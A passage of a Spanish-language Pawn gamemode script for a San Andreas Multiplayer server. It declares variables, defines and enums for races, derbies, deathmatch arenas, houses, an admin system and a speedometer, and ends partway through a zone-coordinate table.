     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 290
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 291
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 292
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 293
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 294
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 295
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 296
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 297
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}, //skin 298
     {0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000} //skin 299
     };

//=========================== Auto Tanque ====================================//
new FireShotON[MAX_PLAYERS];
new FireShot[MAX_PLAYERS];
new	gRocketObj[MAX_PLAYERS];
forward ShotFire(playerid);
//=========================== GhostRider ====================================//
#define PROPERTY_OFFSET(%0) \
	((((%0) * ((%0) << 1)) << 2) + 65536)
new GhostRiderObjects[MAX_PLAYERS][3];
new ColorBeforeTransformation[MAX_PLAYERS][2];
new SkinBeforTransformation[MAX_PLAYERS];
#define GhostRider 100

//=========================== Auto C-BUG ==================//
new PlayerAutoCBUG[MAX_PLAYERS];
////////////////////
new PickupLimit=6;
new DeleteTime=10;
#define lmenu 230
//new AntiRapidFire[MAX_PLAYERS];
#define MAX_ENTER_VEHICLES 3
new pVehicles[MAX_PLAYERS];
//new BalaExplosiva;
new BalasExplosivas[MAX_PLAYERS];
new BalasSniperDM[MAX_PLAYERS];
new Puto;
#define Guerra 506
new UsarArmas[MAX_PLAYERS];
new UsarVehiculos[MAX_PLAYERS];
new UsarVida[MAX_PLAYERS];
new UsarArmadura[MAX_PLAYERS];
#define SPECIAL_ACTION_PISSING      68
new DetenerS;
#define Musicall 888
new Rmusica;
new Musica;
forward ResetMusic();
enum InRace2
{
	InRace,
}
new Race[InRace2];
enum pInRace2
{
	pInRace
}
new pRace[MAX_PLAYERS][pInRace2];
new BloquearComandosInRace[MAX_PLAYERS];
new Text:TDerby;
new Text:TRace;
new Text:TRaceTiempoRestante;
new Text:TRaceJugadores;
new Text:TCheckpoint;
new Text:TRaceTiempoRestante2[MAX_PLAYERS];
new Text:TRaceJugadores2[MAX_PLAYERS];
new Text:TCheckpoint2[MAX_PLAYERS];
//new Carreras;
//new ret_memcpy;
//new Text:Carrera;
//new TextDrawTimer;
#define ForEach(%0,%1) \
for(new %0 = 0; %0 != %1; %0++) if(IsPlayerConnected(%0) && !IsPlayerNPC(%0))
#define Loop(%0,%1) \
for(new %0 = 0; %0 != %1; %0++)
#define IsOdd(%1) \
((%1) & 1)
#define ConvertTime(%0,%1,%2,%3,%4) \
new \
Float: %0 = floatdiv(%1, 60000) \
;\
%2 = floatround(%0, floatround_tozero); \
%3 = floatround(floatmul(%0 - %2, 60), floatround_tozero); \
%4 = floatround(floatmul(floatmul(%0 - %2, 60) - %3, 1000), floatround_tozero)
#define function%0(%1) \
forward%0(%1); public%0(%1)
#define MAX_RACE_CHECKPOINTS_EACH_RACE \
120
#define MAX_RACES \
100
#define COUNT_DOWN_TILL_RACE_START \
60 // seconds
#define MAX_RACE_TIME \
900 // seconds
#define RACE_CHECKPOINT_SIZE \
12.0
#define DEBUG_RACE \
0
#define DIALOG_RACES \
350
//#define RACE_IN_OTHER_WORLD // Uncomment to enable
new
BuildRace,
BuildVehicle,
BuildCreatedVehicle,
RaceBusy = 0x00,
RaceName[30],
RaceVehicle,
RaceType,
TotalCP,
Float: RaceVehCoords[2][4],
Float: CPCoords[MAX_RACE_CHECKPOINTS_EACH_RACE][4],
CreatedRaceVeh[MAX_PLAYERS],
Index2,
PlayersCount[2],
CountTimer,
CountAmount,
bool: Joined[MAX_PLAYERS],
RaceTick,
RaceStarted,
CPProgess[MAX_PLAYERS],
Position,
FinishCount,
JoinCount,
rCounter,
RaceTime,
InfoTimer[MAX_PLAYERS],
RacePosition[MAX_PLAYERS],
RaceNames[MAX_RACES][128],
TotalRaces,
bool: AutomaticRace,
TimeProgress
;
//=================================== Rejas ==========================================================//
new Reja1_is_open;
new Reja1;
//=================================== Anti flood vehiculos ===========================================//
new playervehicle[MAX_PLAYERS];
//=================================== Menú con imágenes o dialogs clickeables================================
new SpawnedVehicles[MAX_PLAYERS];
#define PREV_BG_COLOR2   0xFFFF00FF
#define DIALOG_BG_COLOR  0xFFFF00FF
#define PREV_BG_COLOR    0x88888899

new autoslist = mS_INVALID_LISTID;
new armaslist = mS_INVALID_LISTID;
new skinlist = mS_INVALID_LISTID;
////////////////////////////////////////////////////////////////////////////////////////
#define MenuVehiculo 250
#define MenuCasa 150
#define MenuNegocio 75
#define Teles 1550
#define OtherCmds2 1150
#define OtherCmds3 1151
new lstring[256];
new EmpezarGT;
new TerminarGT;
new GuerraTotal;
new ArmasProhibidas[MAX_PLAYERS];
static bool:OnFly[MAX_PLAYERS];
forward InitFly(playerid);
forward bool:StartFly(playerid);
forward Fly(playerid);
forward bool:StopFly(playerid);
forward static SetPlayerLookAt(playerid,Float:x,Float:y);
forward MSeconds();
new Glow[MAX_PLAYERS];
new MSecondsTimer;
new GlowColor;
new GlowColors[37] = {
0xFF0000FF,
0xFF4E00FF,
0xFF7E00FF,
0xFFA800FF,
0xFFC000FF,
0xFFD800FF,
0xFFF600FF,
0xEAFF00FF,
0xD2FF00FF,
0x9CFF00FF,
0x3CFF00FF,
0x00FF2AFF,
0x00FF90FF,
0x00FFBAFF,
0x00FFF0FF,
0x00F6FFFF,
0x00C6FFFF,
0x00BAFFFF,
0x0096FFFF,
0x0084FFFF,
0x006CFFFF,
0x004EFFFF,
0x003CFFFF,
0x0000FFFF,
0x1200FFFF,
0x3600FFFF,
0x4E00FFFF,
0x6C00FFFF,
0x8A00FFFF,
0xA800FFFF,
0xC000FFFF,
0xDE00FFFF,
0xFF00F6FF,
0xFF00A8FF,
0xFF007EFF,
0xFF0066FF,
0xFF0036FF
};
new Text:vehiclehpbar[13]; //VIDA VEHICULOS
new vremea[MAX_PLAYERS];
new crazycar[MAX_PLAYERS];
new ColorCar[MAX_PLAYERS];
new MegaJump[MAX_PLAYERS];
#define PRESSED(%0) \
(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
new bool:CreatedRamp[MAX_PLAYERS];
new Enabled[MAX_PLAYERS];
new Ramp[MAX_PLAYERS];
new Pers[MAX_PLAYERS];
forward RandomMessage();
new bombtimer[MAX_PLAYERS];
new Float: BombX[MAX_PLAYERS], Float: BombY[MAX_PLAYERS], Float: BombZ[MAX_PLAYERS], BombObject[MAX_PLAYERS], bool: BombArmed[MAX_PLAYERS];
forward BombTimer(playerid);
new Color;
//======================================= PICKUPS =============================
new drift;
new pickup_reja1;
new pickup2_reja1;
//======================================= TEXTDRAWS DE CARGA ==============================
new
Text:cargando,
Text:looking,
Text:streamer,
Text:box;
///////////////////////////////////////////////////////////////////////////////
new Text:TBox;
new Text:TComandos;
new Text:Guerratotal;
new Text:Guerratotal1;
#if !defined Loop
#define Loop(%0,%1) \
for(new %0 = 0; %0 != %1; %0++)
#endif
#if !defined function
#define function%0(%1) \
forward%0(%1); public%0(%1)
#endif
#if !defined TIME
#define TIME \
600000
#endif
new
xCharacters[][] =
{
"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
"0", "1", "2", "3", "4", "5", "6", "7", "8", "9"
},
xChars[16] = "",
xReactionTimer,
xCash,
xScore,
bool: xTestBusy
;
new Reaction[MAX_PLAYERS];
#define AFKVW 10
new currentvw;
new currentcolor[MAX_PLAYERS];
new afk[MAX_PLAYERS];
//new municion;
enum Info
{
Bloqueado,
};
new Informacion[MAX_PLAYERS][Info];
forward CargarObjetos(playerid);
forward AntiSpawnKill(playerid);
new BloquearComandosInBank[MAX_PLAYERS];
new BloquearComandosInDM[MAX_PLAYERS];
new BloquearComandosInDerby[MAX_PLAYERS];
new fString[140];
new Text:TDeathmatch;
new Text:TJugadores;
new Text:TJugadores2;
new Text:TComandosDM;
new Float:gInDM1[2][3] = {
{1726.7372,-1642.2229,20.2251},
{1728.1016,-1670.0486,27.1953}
};
new Float:gInDM2[3][3] ={
{2567.5200,-1294.5900,1063.2520},
{2560.9873,-1282.5452,1054.6406},
{2561.0452,-1304.2778,1054.6406}
};
new Float:gInDM3[4][3] = {
{2240.8333,-1191.9053,1033.7969},
{2190.4316,-1180.1709,1033.7896},
{2201.6384,-1157.2543,1029.7969},
{2227.8989,-1183.5277,1029.7969}
};
new Float:gInDM4[3][3] = {
{1250.2246,5.8390,1008.2578},
{1259.7762,-20.4598,1001.0234},
{1273.7959,-64.2315,1002.4965}
};
new Float:gInMiniDM[2][3] = {
{-2160.3069,638.6475,1057.5861},
{-2160.6821,641.7176,1052.3817}
};
new Float:gInMiniDM2[2][3] = {
{301.5638,303.2520,1003.5391},
{303.1573,303.1300,999.1484}
};
new Float:gInBoxDM[4][3] = {
{2112.7615,921.9929,17.8514},
{2112.7739,917.6982,17.8514},
{2116.8989,917.6977,17.8514},
{2116.8799,921.9899,17.8514}
};
new Float:gInProDM[2][3] = {
{-1131.5500,1057.8721,1346.4161},
{-973.9669,1061.0402,1345.6747}
};
new Float:gInMinigunDM[10][3] = {
{1410.5425,2176.3142,12.0156},
{1409.6898,2206.1653,19.8438},
{1370.7050,2196.3381,9.7578},
{1321.1451,2196.9858,11.0234},
{1329.6407,2210.1064,12.0156},
{1298.7916,2156.4512,11.0234},
{1325.2078,2101.3110,11.0156},
{1416.5570,2102.6685,23.4782},
{1390.2469,2218.6946,23.4464},
{1418.9036,2125.6411,29.6907}
};
new Float:gInSniperDM[8][3] = {
{2570.6631,2660.4712,38.0336},
{2689.5056,2703.0957,28.1563},
{2573.2778,2828.6648,27.8203},
{2618.5801,2721.4670,36.5386},
{2619.7686,2758.3865,23.8222},
{2662.2205,2818.5532,38.3222},
{2657.4578,2659.0769,38.0110},
{2614.1179,2660.2988,38.0053}
};
new Float:gInGuerraDM[9][3] = {
{2447.5464,-2680.2290,21.4924},
{2510.8770,-2652.2534,27.0000},
{2458.0466,-2459.0356,26.6421},
{2628.6064,-2419.9158,13.6328},
{2739.7539,-2515.4673,17.3672},
{2793.0684,-2416.3413,13.6324},
{2701.9265,-2356.7053,27.2826},
{2541.9375,-2340.5159,13.6250},
{2615.6184,-2511.5593,33.1887}
};

enum InDerby2{
	InDerby,
}
enum pInDerby{
	pInDerby1,
}
new Derby[InDerby2];
new pDerby[MAX_PLAYERS][pInDerby];
enum InDM
{
	InDM1,
	InDM2,
	InDM3,
	InDM4,
	InMiniDM,
	InMiniDM2,
	InDesmadre,
	InBoxDM,
	InProDM,
	InMinigunDM,
	InSniperDM,
	InGuerraDM,
}
new Deathmatch[InDM];
enum pInDM
{
	pInDM1,
	pInDM2,
	pInDM3,
	pInDM4,
	pInMiniDM,
	pInMiniDM2,
	pInDesmadre,
	pInBoxDM,
	pInProDM,
	pInMinigunDM,
	pInSniperDM,
	pInGuerraDM
}
new pDeathmatch[MAX_PLAYERS][pInDM];
#define DIALOGID2 210
#define Obje 350
#define Obje2 360
#define Obje3 290
#define Estilos_Peleas 60
#define Climas 200
new Armas;
#define ChatColor 1353
new TagOwner[MAX_PLAYERS];
new TagEncargado[MAX_PLAYERS];
new TagAdmin2[MAX_PLAYERS];
new TagAdmin[MAX_PLAYERS];
new TagVip[MAX_PLAYERS];
new TagActivado[MAX_PLAYERS];
new ColorGris[MAX_PLAYERS];
new ColorMarron[MAX_PLAYERS];
new ColorDorado[MAX_PLAYERS];
new ColorVioleta[MAX_PLAYERS];
new ColorNaranja[MAX_PLAYERS];
new ColorCeleste[MAX_PLAYERS];
new ColorRosa[MAX_PLAYERS];
new ColorAmarillo[MAX_PLAYERS];
new ColorVerde[MAX_PLAYERS];
new ColorAzul[MAX_PLAYERS];
new ColorRojo[MAX_PLAYERS];
new ColorNegro[MAX_PLAYERS];
new ChatColorActivado[MAX_PLAYERS];
#define ChatColor 1353
#define Autos 503
new bool:AntiFlood[MAX_PLAYERS];
new AntiJoinFlood=1;
new AntiFakeKill=1;
new AntiBots=1;
#define neondialog 8131 //NEONES
#define MenorTiempo   10000
#define Logueos       2
forward Detect(playerid);
new Barra[MAX_PLAYERS] = {-1,...}, Advertencias[MAX_PLAYERS] = {0,...}, bool:BotServidor[MAX_PLAYERS] = {false, ...}, Jugadores = MAX_PLAYERS;
new Muertes[MAX_PLAYERS];
new MuerteReciente[MAX_PLAYERS];
new EntrarIP[10][20];
new EntrarCuenta[10];
new bool:DPM[MAX_PLAYERS];
#define NickPrincipal                                                          \
     "Psicoloco"
#define AdminCmds 475
#define VipCmds 78
#define Comandos 351
#define REGISTRO 20
#define INGRESO 30
#define INGRESO2 40

//================================================== PACK DE ARMAS =====================================
#define packs 567
//==============================================================================
#pragma dynamic 556992

#define HOLDING(%0) \
	((newkeys & (%0)) == (%0))
#define RELEASED(%0) \
	(((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))
#define B_FILE_LOAD "SATDM/Businesses/businesses_setup.txt"
#define B_FILE_SAVE "SATDM/Businesses/businesses_save.txt"
#define V_FILE_LOAD "SATDM/Vehicles/vehicles_setup.txt"
#define V_FILE_SAVE "SATDM/Vehicles/vehicles_save.txt"
//#define V_FILE_OBJETOS "SATDM/Vehicles/vehicles_objetos.txt"
#define TEMP_PARK //Comment this to Enable permanent parking for regular players
#define B_ICON 1274
#define B_ICON_TYPE 52
#define PD_TIMER 1800000
#define CALL_UNIT_COST 1
#define DEFAULT_OWNER "[null]"
#define B_LIMIT 2800

#define RC_BANDIT	441
#define RC_BARON    464
#define RC_GOBLIN   501
#define RC_RAIDER   465
#define D_TRAM      449
#define RC_TANK     564
#define RC_CAM      594

#define COLOR_BLACK 			0x000000AA
#define COLOR_RED				0xAA3333AA
#define COLOR_YELLOW			0xFFFF00AA
#define COLOR_BLUE				0x0000BBAA
#define COLOR_WHITE				0xFFFFFFAA
#define COLOR_LIGHTBLUE			0x33CCFFAA
#define COLOR_INDIGO			0x4B00B0AA
#define COLOR_DARKYELLOW		0xE5E52BAA
#define COLOR_BASIC				0x0066FFAA
#define yellow					0xFFFF00AA
#define green					0x33FF33AA
#define red						0xFF0000AA
#define white					0xFFFFFFAA
#define pink					0xCCFF00FF
#define blue					0x00FFFFAA
#define grey					0xC0C0C0AA
#define orange					0xFF9900AA
#define black					0x2C2727AA
#define lightblue				0x33CCFFAA
#define NICE_PINK				0xEC13C0FF
#define COLOR_GRAD1				0xB4B5B7AA
#define COLOR_GREEN1			0x33AA33AA
#define COLOR_FADE1				0xE6E6E6E6
#define COLOR_FADE2				0xC8C8C8C8
#define COLOR_FADE3				0xAAAAAAAA
#define COLOR_FADE4				0x8C8C8C8C
#define COLOR_FADE5				0x6E6E6E6E
#define COP_MSG					0x660066AA
#define COLOR_ERROR				0xD2691EAA
#define COLOR_DODGERBLUE		0x1E90FFAA
#define COLOR_ROYALBLUE			0x4169FFAA
#define COLOR_FORESTGREEN		0x228B22AA
#define MESSAGE_COLOR			0xEEEEEEFF
#define ACTION_COLOR			0xEE66EEFF
#define ADMINFS_MESSAGE_COLOR 0xFF444499
#define PM_INCOMING_COLOR     0xFFFF22AA
#define PM_OUTGOING_COLOR     0xFFCC2299
//===============================Dialog Defines=================================
//#define ListCommand(%1,%2) gTemp[0]=%2;format(gTempString,sizeof(gTempString),"%s%s%s\n",gTempString,%1,(gTemp[0] == OPTION_TYPE_COMMAND) ? ("") : ("..."))
#define OPTION_TYPE_COMMAND 0
#define OPTION_TYPE_CATEGORY 1
#define DIALOGID0 1100
#define DIALOGID3 1337
#define PARAM_TYPE_PLAYER 2

//new gTempString[512]; //Global Temporary String So That It Doesn't Need To Be Created Again
//new gTemp[2];
//new pPlayerListPage[MAX_PLAYERS];
//=========================Business and Bank Defines============================
#define MAX_BUSINESSES (1000)
new bizcount;
new Text3D:bizTextInfo[MAX_BUSINESSES];
//=========================Simple House System==================================
//-------------------------------Houses-----------------------------------------
#define MAX_HOUSES 2000
#define MAX_DISTANCE_TO_PROP 1.5
#define MAX_RENTCOST 1000
#define MIN_RENTCOST 500

new Text3D:hTextInfo[MAX_HOUSES];
new SaveFile[50] = "HouseCoord.txt";
//----------------------------
#define c_y 0xFFFF00AA
#define c_r 0xAA3333AA
new HousePickup[MAX_HOUSES];
new playerinterior[MAX_PLAYERS]=-1;
new Float:housex, Float:housey, Float:housez;
new housemapicon[MAX_HOUSES];
new playerworld[MAX_PLAYERS];
forward rentfee();
forward newcar();
forward KillVehicle(carid);

enum HouseInfo
{
	Name[24],
	Renter[24],
	Rentable,
	Rentcost,
	Cost,
	Sell,
	Interior,
	Virtualworld,
	Locked,
	Float:InteriorX,
	Float:InteriorY,
	Float:InteriorZ,
	Float:iconx,
	Float:icony,
	Float:iconz,
	Rentfee
}
new hInfo[MAX_HOUSES][HouseInfo];

new HouseID;

new bool:AceleracionBrutal[MAX_PLAYERS];// SUPERNITRO
new bool:SaltosVehiculo[MAX_PLAYERS]; //SALTOS VEHICULO
//=====================Ladmin===================================================
//#define DISPLAY_CONFIG 	// displays configuration in console window on filterscript load
#define SAVE_LOGS           // Comment if your server runs linux (logs wont be saved)
#define ENABLE_SPEC         // Comment if you are using a spectate system already

#define USE_STATS           // Comment to disable /stats
#define ANTI_MINIGUN        // Displays who has a minigun
//#define HIDE_ADMINS 		// Displays number of admins online instead of level and names
#define ENABLE_FAKE_CMDS   	// Comment to disable /fakechat, /fakedeath, /fakecmd commanads

#define MAX_WARNINGS 3      // /warn command

#define MAX_REPORTS 7

#define SPAM_MAX_MSGS 5
#define SPAM_TIMELIMIT 8 // SECONDS

#define PING_MAX_EXCEEDS 4
#define PING_TIMELIMIT 60 // SECONDS

#define MAX_FAIL_LOGINS 5

// Caps
#define UpperToLower(%1) for ( new ToLowerChar; ToLowerChar < strlen( %1 ); ToLowerChar ++ ) if ( %1[ ToLowerChar ]> 64 && %1[ ToLowerChar ] < 91 ) %1[ ToLowerChar ] += 32
// Spec
#define ADMIN_SPEC_TYPE_NONE 0
#define ADMIN_SPEC_TYPE_PLAYER 1
#define ADMIN_SPEC_TYPE_VEHICLE 2
// rcon
#define MAX_CHAT_LINES 7
new Chat[MAX_CHAT_LINES][200];

//Timers
new PingTimer;
new GodTimer;
new JailTimer[MAX_PLAYERS];
new FreezeTimer[MAX_PLAYERS];
new LockKickTimer[MAX_PLAYERS];

// Forbidden Names & Words
new BadNames[100][100], // Whole Names
    BadNameCount = 0,
	BadPartNames[100][100], // Part of name
    BadPartNameCount = 0,
    ForbiddenWords[100][100],
    ForbiddenWordCount = 0;

// Report
new Reports[MAX_REPORTS][128];
// Ping Kick

new PingPos;
//===================================== SISTEMA DE DERBY =================================//
/*      DERBY SYSTEM	*/

#define	DERBY_SYSTEM_VERSION	"1.10"
#define DERBY_SYSTEM_DATE		"06/11/2018"

#define MAX_DERBY_PLAYERS   	20
#define MAX_DERBYS          	100
#define MAX_DERBY_OBJECTS   	500
#define DERBY_VIRTUAL_WORLD 	666
#define DERBY_TIME_COUNTDOWN	10	// 10 segundos de espera para que se unan jugadores
#define DERBY_WINNER_SCORE		5 	// score que se llevara el jugador ganador del derby
#define	FREEROAM_VIRTUAL_WORLD	0

#define COLOR_ROJO 0xFF0000AA

native IsValidVehicle(vehicleid);

enum //JUEGOS GM
{
	GAME_NONE,
	GAME_FREEROAM,
	GAME_DERBY
};

enum //ESTADOS GENERALES JUGADOR
{
	STATUS_CONNECTED,
	STATUS_DEAD,
	STATUS_CLASS,
	STATUS_SPAWNED
};

enum //ESTADOS JUGADOR EN DERBY
{
	PD_NORMAL,
	PD_DEAD
};

enum //ESTADOS DERBY
{
	DERBY_CLOSED,
	DERBY_WAIT,
	DERBY_RUNNING
};

enum DERBY_INFO
{
	MAP_ID,
	STATUS,
	NAME[24],
	MODELID,
	Float:ZPOS, //Posicion a la que sera descalificado
	PLAYERSD,
	ACTIVE_PLAYERS,
	COUNTDOWN_TIMER,
	COUNTDOWN_COUNTER,
	MESSAGE_TIMER,
	MAX_PRIZE,
	TIME_OUT_COUNTER,
	TIME_OUT_TIMER,
	TEXTDRAW_ANIMATION,
	NEXT_DERBY_TIMER
};

enum DERBY_OBJECTS_INFO
{
	OBJECT_ID,
	OBJECT_MODELID,
	Float:OBJECT_POS[6]
};

enum PLAYER_INFO
{
	P_NAME[24],
	P_STATUS, //estos deben de ser variables o algo que tengas por tu gm
	P_GAMEMODE,

	P_DERBY_VEHICLEID,
	P_DERBY_STATUS,
	P_DERBY_SPECTATEPLAYER,
	P_DERBY_SLOT
};

enum DERBY_INFO_LOAD
{
	DERBY_FILE_EXISTS,
	DERBY_NAME[24],
	DERBY_FILE_VALID
};

new

	TOTAL_DERBYS,
	TOTAL_DERBYS_OK,

	DERBY_FILE_INFO[MAX_DERBYS][DERBY_INFO_LOAD],
	DI[DERBY_INFO],
	DERBY_OBJECTS[MAX_DERBY_OBJECTS][DERBY_OBJECTS_INFO],
	DERBY_SLOT_USED[MAX_DERBY_PLAYERS],
	Float:DERBY_SPAWN_POS[MAX_DERBY_PLAYERS][4],
	Text:TD_DERBY_Message, Text: TD_DERBY,
	WaitTextDrawAnimation [] [] =
	{
		"~g~~h~esperando_jugadores.",
		"~b~~h~esperando_jugadores..",
		"~r~~h~esperando_jugadores..."
	},

	Float:FREEROAM_POS[] = {1958.3783, 1343.1572, 15.3746, 270.0},
	PI[MAX_PLAYERS][PLAYER_INFO],

	Object_String[512];

forward DerbyCountdown();
forward TD_DERBY_SetString(text[]);
forward DerbyTimeOut();
forward NextDerby();

AutoPositionOffsets(modelid, &Float:X, &Float:Y, &Float:Z, &Float:RX, &Float:RY, &Float:RZ)
{
	new Float:pos[6];
	switch(modelid)
	{
		case 3458, 8838, 8557, 8558:
		{
			switch(random(4)) // 4 posibles offset para un mismo objeto
			{
				case 0: pos = Float:{-12.0, 0.0, 2.3, 0.0, 0.0, 90.0};
				case 1: pos = Float:{12.0, 0.0, 2.3, 0.0, 0.0, -90.0};
				case 2: pos = Float:{0.0, 0.0, 2.3, 0.0, 0.0, 90.0};
				case 3: pos = Float:{0.0, 0.0, 2.3, 0.0, 0.0, -90.0};
			}
		}
		default: return 0;
	}

	X = pos[0]; Y = pos[1]; Z = pos[2];
	RX = pos[3]; RY = pos[4]; RZ = pos[5];
	return 1;
}


//====================================== VELOCIMETRO ====================================//
//=======================================Speedo=================================
#define PLAYERS MAX_PLAYERS
//******************************************************************************
// SpeedoMeter Configurations
//******************************************************************************

//::::::::::::::::::::::::::::::::::::
// -> Functions Config <-
//::::::::::::::::::::::::::::::::::::
#define VehicleMaxSpeed  500                //Define the Speed Limit! (KPH)
#define SpeedoLogoText   " " //Define Speedo Logo (Text in Speedo Top)
#define UpdateSpeed     500               //Update Speedo functions in ... (Miliseconds)


//::::::::::::::::::::::::::::::::::::
// -> Speedo TextDraw Config <-
//::::::::::::::::::::::::::::::::::::
#define TextBox         true   //Enable/Disable Speedo Box
#define TextTopLines    false   //Enable/Disable Speedo Top Lines
#define TextSideLines   false   //Enable/Disable Speedo Side Lines
#define LogoName        true  //Enable/Disable Speedo LogoName

//Enable = true || Disable = false


//::::::::::::::::::::::::::::::::::::
// -> Speedo Colors Config <-
//::::::::::::::::::::::::::::::::::::
#define BoxColor         0xffffffff     //Color of Speedo Box
#define LogoColor        0xffffffff     //Color of Seedo Logo (Define logo in "SpeedoLogoText" (Line 57)
#define SideLinesColor   0xffffffff     //Color of Speedo Side Lines
#define TopLinesColor    0xffffffff     //Color of Speedo Top lines
#define CategoriesColor  "~r~"          //Color of (Vehicle,Health,Altitude,Gps)
#define MPH_KPH_Color    "~r~"          //Color of (MPH,KPH)

//******************************************************************************
new Text:LBox[MAX_PLAYERS];
new Text:LLine1[MAX_PLAYERS];
new Text:LLine2[MAX_PLAYERS];
new Text:LLine3[MAX_PLAYERS];
new Text:LLine4[MAX_PLAYERS];
new Text:LCredits[MAX_PLAYERS];
new Text:Lmph[MAX_PLAYERS];
new Text:LFunc[MAX_PLAYERS];

new LuX_SpeedoMeter[MAX_PLAYERS];

new lstr[256];

enum MainZone{
Zone_Name[28], Float:Zone_Area[6] };

static const SanAndreasZones[][MainZone] = {

	{"The Big Ear",	                {-410.00,1403.30,-3.00,-137.90,1681.20,200.00}},
	{"Aldea Malvada",               {-1372.10,2498.50,0.00,-1277.50,2615.30,200.00}},
	{"Angel Pine",                  {-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00}},
	{"Arco del Oeste",              {-901.10,2221.80,0.00,-592.00,2571.90,200.00}},
	{"Avispa Country Club",         {-2646.40,-355.40,0.00,-2270.00,-222.50,200.00}},
	{"Avispa Country Club",         {-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00}},
	{"Avispa Country Club",         {-2361.50,-417.10,0.00,-2270.00,-355.40,200.00}},
	{"Avispa Country Club",         {-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10}},
	{"Avispa Country Club",         {-2470.00,-355.40,0.00,-2270.00,-318.40,46.10}},
	{"Avispa Country Club",         {-2550.00,-355.40,0.00,-2470.00,-318.40,39.70}},
	{"Back o Beyond",               {-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00}},
	{"Battery Point",               {-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00}},
	{"Bayside",                     {-2741.00,2175.10,0.00,-2353.10,2722.70,200.00}},
	{"Bayside Marina",              {-2353.10,2275.70,0.00,-2153.10,2475.70,200.00}},
	{"Beacon Hill",                 {-399.60,-1075.50,-1.40,-319.00,-977.50,198.50}},
	{"Blackfield",                  {964.30,1203.20,-89.00,1197.30,1403.20,110.90}},
	{"Blackfield",                  {964.30,1403.20,-89.00,1197.30,1726.20,110.90}},
	{"Blackfield Chapel",           {1375.60,596.30,-89.00,1558.00,823.20,110.90}},
	{"Blackfield Chapel",           {1325.60,596.30,-89.00,1375.60,795.00,110.90}},
	{"Blackfield Intersection",     {1197.30,1044.60,-89.00,1277.00,1163.30,110.90}},
	{"Blackfield Intersection",     {1166.50,795.00,-89.00,1375.60,1044.60,110.90}},
	{"Blackfield Intersection",     {1277.00,1044.60,-89.00,1315.30,1087.60,110.90}},
	{"Blackfield Intersection",     {1375.60,823.20,-89.00,1457.30,919.40,110.90}},
	{"Blueberry",                   {104.50,-220.10,2.30,349.60,152.20,200.00}},
	{"Blueberry",                   {19.60,-404.10,3.80,349.60,-220.10,200.00}},
	{"Blueberry Acres",             {-319.60,-220.10,0.00,104.50,293.30,200.00}},
	{"Caligula's Palace",           {2087.30,1543.20,-89.00,2437.30,1703.20,110.90}},
	{"Caligula's Palace",           {2137.40,1703.20,-89.00,2437.30,1783.20,110.90}},
	{"Calton Heights",              {-2274.10,744.10,-6.10,-1982.30,1358.90,200.00}},
	{"Chinatown",                   {-2274.10,578.30,-7.60,-2078.60,744.10,200.00}},
	{"City Hall",                   {-2867.80,277.40,-9.10,-2593.40,458.40,200.00}},
	{"Come-A-Lot",                  {2087.30,943.20,-89.00,2623.10,1203.20,110.90}},
	{"Commerce",                    {1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90}},
	{"Commerce",                    {1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90}},
	{"Commerce",                    {1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90}},
	{"Commerce",                    {1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90}},
	{"Commerce",                    {1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90}},
	{"Commerce",                    {1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90}},
	{"Conference Center",           {1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90}},
	{"Conference Center",           {1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90}},
	{"Cranberry Station",           {-2007.80,56.30,0.00,-1922.00,224.70,100.00}},
	{"Creek",                       {2749.90,1937.20,-89.00,2921.60,2669.70,110.90}},
	{"Dillimore",                   {580.70,-674.80,-9.50,861.00,-404.70,200.00}},
	{"Doherty",                     {-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00}},
	{"Doherty",                     {-2173.00,-222.50,-0.00,-1794.90,265.20,200.00}},
	{"Downtown",                    {-1982.30,744.10,-6.10,-1871.70,1274.20,200.00}},
	{"Downtown",                    {-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00}},
	{"Downtown",                    {-1700.00,744.20,-6.10,-1580.00,1176.50,200.00}},
	{"Downtown",                    {-1580.00,744.20,-6.10,-1499.80,1025.90,200.00}},
	{"Downtown",                    {-2078.60,578.30,-7.60,-1499.80,744.20,200.00}},
	{"Downtown",                    {-1993.20,265.20,-9.10,-1794.90,578.30,200.00}},
	{"Downtown Los Santos",         {1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90}},
	{"Downtown Los Santos",         {1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90}},
	{"Downtown Los Santos",         {1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90}},
	{"Downtown Los Santos",         {1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90}},
	{"Downtown Los Santos",         {1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90}},
	{"Downtown Los Santos",         {1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90}},
